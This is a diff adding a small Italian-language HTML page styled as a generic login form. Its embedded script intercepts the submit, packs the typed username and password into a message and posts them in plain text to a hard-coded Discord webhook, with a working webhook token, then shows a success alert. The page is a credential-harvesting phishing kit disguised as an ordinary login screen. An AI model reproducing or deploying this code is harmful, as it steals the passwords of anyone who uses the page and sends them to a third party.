@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #f0f0f0;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        input {
+            margin: 10px 0;
+            padding: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        button {
+            padding: 10px 20px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Login</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Send
+            </button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Impedisce il submit del modulo
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // Dati da inviare al Webhook di Discord
+            const message = {
+                content: `**Nuovo Login**\nUsername: ${username}\nPassword: ${password}`
+            };
+
+            // URL del Webhook di Discord
+            const webhookUrl = "https://discord.com/api/webhooks/1330905454200754207/fzUFDc5ZEpCknT1cAYZ19XzSMNFEiGbF8QLTIqKRcT9rUJoRYR2zEivlwGJ0vg-b7XHq";
+
+            // Funzione per inviare i dati al Webhook
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Dati inviati con successo!");
+                // Resetta i campi
+                document.getElementById("loginForm").reset();
+            })
+            .catch(error => {
+                console.error("Errore durante l'invio:", error);
+                alert("Si è verificato un errore.");
+            });
+        });
+    </script>
+</body>
+</html>
